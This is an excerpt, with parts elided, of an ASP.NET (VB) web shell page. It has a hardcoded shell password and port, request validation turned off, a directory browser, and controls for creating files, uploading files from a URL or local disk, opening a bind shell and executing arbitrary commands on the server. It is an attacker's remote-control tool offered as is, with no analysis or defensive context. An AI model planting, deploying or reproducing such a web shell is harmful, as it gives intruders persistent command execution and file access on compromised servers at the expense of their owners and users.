...
Dim shell_password As String = "ppp3rc1val1337&^$:)*"
Dim shell_fav_port As String = "12345"
Dim shell_color As String = "#374374"
    </script>

    <%@ Page Language="VB" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false"
    ...
    Function xparsedir(ByVal dir As String) As String
        ...
        For Each d As String In dirs
            ...
            If(d <> "") Then
                ...
                buff &= "<a href=""?dir=" & dlink & """>" & d & " " & "\" & "</a >& nbsp; "
            End If
                                            Next
    ...
    End Sub
                                        ...
                                        <body onload="setfocus();">
                                            <div id="mainwrapper" runat="server">
                                                <div id="wrapper">
                                                    <h1 onmouseover="this.style.cursor='pointer';this.style.cursor='hand';"
                                                        onclick="window.location= '?';" runat="server" id="headertop">
                                                    </h1>
                                                    <div class="box">
                                                        <div id="serverinfo" runat="server"></div>
                                                        <div class="menu">
                                                            <a href="javascript:show('xnewfile');"><span class="gaul">[
                                                                </span> New File<span class="gaul"> ]</span></a>
                                                            <a href="javascript:show('xnewfolder');"><span
                                                                    class="gaul">[ </span>New Folder<span class="gaul">
                                                                    ]</span></a>
                                                            <a href="javascript:show('xnewchild');"><span class="gaul">[
                                                                </span>Replicate<span class="gaul"> ]</span></a>
                                                            <a href="javascript:show('xnewupload');"><span
                                                                    class="gaul">[ </span>Upload<span class="gaul">
                                                                    ]</span></a>
                                                            <a href="javascript:show('xnewconnect');"><span
                                                                    class="gaul">[ </span>BindShell<span class="gaul">
                                                                    ]</span></a>
                                                        </div>
                                                        ...
                                                        <div class="hidden" id="xnewupload">
                                                            <form runat="server" id="uploadform" method="post" action=""
                                                                enctype="multipart/form-data"
                                                                style="display:inline;margin:0;padding:0;">
                                                                <table class="tblBox" style="width:560px;">
                                                                    <tr>
                                                                        <td style="width:120px;">Save as</td>
                                                                        <td><input style="width:300px;" type="text"
                                                                                name="ufname" id="ufname" value=""
                                                                                runat="server" /></td>
                                                                    </tr>
                                                                    <tr>
                                                                        <td style="width:120px;">From Url</td>
                                                                        <td style="width:304px;">
                                                                            <input style="width:300px;" type="text"
                                                                                name="fileurl" id="fileurl"
                                                                                runat="server" value="" />
                                                                        </td>
                                                                        <td><input style="width:100px;" type="submit"
                                                                                class="btn" name="btnNewUploadUrl"
                                                                                value="Get" /></td>
                                                                    </tr>
                                                                    <tr>
                                                                        <td style="width:120px;">From Computer</td>
                                                                        <td style="width:304px;">
                                                                            <input style="width:300px;" type="file"
                                                                                name="filelocal" id="filelocal"
                                                                                runat="server" />
                                                                        </td>
                                                                        <td>
                                                                            <input style="width:100px;" type="submit"
                                                                                class="btn" name="btnNewUploadLocal"
                                                                                value="Get" />
                                                                        </td>
                                                                    </tr>
                                                                </table>
                                                        ...
                                                        <div class="bottomwrapper">
                                                                    ...
                                                                    <table style="width:100%;">
                                                                        <tr>
                                                                            <td style="width:88%;"><input type="text"
                                                                                    id="cmd" name="cmd" value=""
                                                                                    style="width:100%;"
                                                                                    runat="server" /></td>
                                                                            <td style="width:10%;"><input type="submit"
                                                                                    class="btn" name="btnCommand"
                                                                                    style="width:120px;"
                                                                                    value="Execute" /></td>
                                                                        </tr>
                                                                    </table>
                                                            ...
                                                            <div class="result" id="resultbox" runat="server"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
